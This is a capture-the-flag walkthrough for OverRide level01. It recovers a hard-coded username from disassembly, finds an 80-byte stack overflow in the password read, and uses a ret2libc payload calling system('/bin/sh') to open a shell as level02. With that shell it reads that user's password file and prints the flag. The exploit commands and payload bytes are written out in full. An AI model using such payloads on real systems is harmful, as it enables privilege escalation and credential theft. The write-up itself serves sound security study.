We start by running the binary:

level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: 

Ok, it asks us for a username, we'll start disassembling the program to find the right one:

(gdb) info function
Non-debugging symbols:
	...
0x08048464  verify_user_name
0x080484a3  verify_user_pass
	...

(gdb) disass verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:	push   %ebp
   0x08048465 <+1>:	mov    %esp,%ebp
   0x08048467 <+3>:	push   %edi
   0x08048468 <+4>:	push   %esi
   0x08048469 <+5>:	sub    $0x10,%esp
   0x0804846c <+8>:	movl   $0x8048690,(%esp)
   0x08048473 <+15>:	call   0x8048380 <puts@plt>
   0x08048478 <+20>:	mov    $0x804a040,%edx
   0x0804847d <+25>:	mov    $0x80486a8,%eax
   0x08048482 <+30>:	mov    $0x7,%ecx
   0x08048487 <+35>:	mov    %edx,%esi
   0x08048489 <+37>:	mov    %eax,%edi
   0x0804848b <+39>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804848d <+41>:	seta   %dl
   0x08048490 <+44>:	setb   %al
   0x08048493 <+47>:	mov    %edx,%ecx
   0x08048495 <+49>:	sub    %al,%cl
   0x08048497 <+51>:	mov    %ecx,%eax
   0x08048499 <+53>:	movsbl %al,%eax
   0x0804849c <+56>:	add    $0x10,%esp
   0x0804849f <+59>:	pop    %esi
   0x080484a0 <+60>:	pop    %edi
   0x080484a1 <+61>:	pop    %ebp
   0x080484a2 <+62>:	ret    
End of assembler dump.
(gdb) x/s 0x80486a8
0x80486a8:	 "dat_wil"

Looking at the functions of the program we find the function "verify_user_name",
at line + 39 we can see a strcmp on esi which is equal to our input, and edi which is equal to "dat_wil".

level01@OverRide:~$ ./level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:

Ok we have our username. But we need password now.
But after having analyzed the binary, we realize that even if we have the right password, there is nothing
allows to have the flag of the next level.
So we will see if we can do it segfault.

level01@OverRide:~$ (python -c 'print ("dat_wil")' ; python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")') | ./level01
********* ADMIN LOGIN PROMPT *********
	...
Segmentation fault (core dumped)
level01@OverRide:~$ dmesg | tail -1
[ 8141.267504] level01[2209]: segfault at 37634136 ip 0000000037634136 sp 00000000ffffd730 error 14

level01@OverRide:~$ (python -c 'print ("dat_wil")' ; python -c 'print("A" * 80 + "BBBB")') | ./level01
********* ADMIN LOGIN PROMPT *********
	...
Segmentation fault (core dumped)
level01@OverRide:~$ dmesg | tail -1
[ 8288.902296] level01[2225]: segfault at 42424242 ip 0000000042424242 sp 00000000ffffd730 error 14

Yes we can, with an offset of 80 bytes.
let's see if the binary contains the "/bin/sh" string and the system function

(gdb) b * main
Breakpoint 1 at 0x80484d0
(gdb) r
Starting program: /home/users/level01/level01 

Breakpoint 1, 0x080484d0 in main ()
(gdb) info proc map
process 1842
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
	0xf7e2b000 0xf7e2c000     0x1000        0x0 
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
	0xf7fd0000 0xf7fd4000     0x4000        0x0 
	0xf7fda000 0xf7fdb000     0x1000        0x0 
	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>

Yeah we have them, let's try a ret2libc method:

level01@OverRide:~$ (python -c 'print ("dat_wil")' ; python -c 'print("A" * 80 + "\xd0\xae\xe6\xf7" + "OUAI" + "\xec\x97\xf8\xf7")' ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

id
uid=1001(level01) gid=1001(level01) euid=1002(level02) egid=100(users) groups=1002(level02),100(users),1001(level01)
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
